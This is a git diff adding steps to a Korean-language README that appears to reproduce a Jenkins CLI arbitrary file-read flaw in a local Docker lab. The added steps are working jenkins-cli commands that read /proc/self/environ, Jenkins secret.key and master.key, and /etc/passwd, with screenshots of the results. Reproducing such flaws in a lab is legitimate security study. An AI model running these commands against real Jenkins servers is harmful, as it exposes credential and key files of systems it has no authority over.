@@ -23,9 +23,30 @@ docker compose up -d
 
 ## 익스플로잇
 먼저 'jenkins-cli.jar' 파일을 다운로드 합니다. 'http://localhost:8080/jnlpJars/jenkins-cli.jar'
-파일을 읽어 '/pro/self/environ' Jenkins 기본 디렉토리를 가져옵니다. 'JENKINS_HOME=/var/jenkins_home'
 
+
+파일을 읽어 '/pro/self/environ' Jenkins 기본 디렉토리를 가져옵니다. 'JENKINS_HOME=/var/jenkins_home'
 ```
 java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/proc/self/environ"
 ```
 <img width="452" alt="1" src="https://github.com/dhsgud/jenkins/assets/61280812/058305eb-ae95-4501-b061-5279f608bdd9">
+
+다음 'secret.key' 또는 'master.key'와 같은 중요한 파일을 검색하는데 사용할 수 있습니다.(명령줄 오류를 통해 파일의 첫 번째 줄만 읽을 수 있습니다.):
+
+```
+java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins_home/secret.key"
+```
+<img width="452" alt="2" src="https://github.com/dhsgud/jenkins/assets/61280812/8746beab-e932-4e61-b3bf-fab4f8fefa19">
+
+```
+java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins_home/secrets/master.key"
+```
+<img width="452" alt="3" src="https://github.com/dhsgud/jenkins/assets/61280812/22c07fdc-6f35-44c0-9f77-631e84637e56">
+
+"익명 읽기 액세스 허용"이 설정되어 있으므로 파일의 전체 내용을 읽을 수도 있습니다 :
+
+```
+java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node "@/etc/passwd"
+```
+
+<img width="452" alt="4" src="https://github.com/dhsgud/jenkins/assets/61280812/064d1f0e-a72a-4a69-b2f2-939439aaa379">
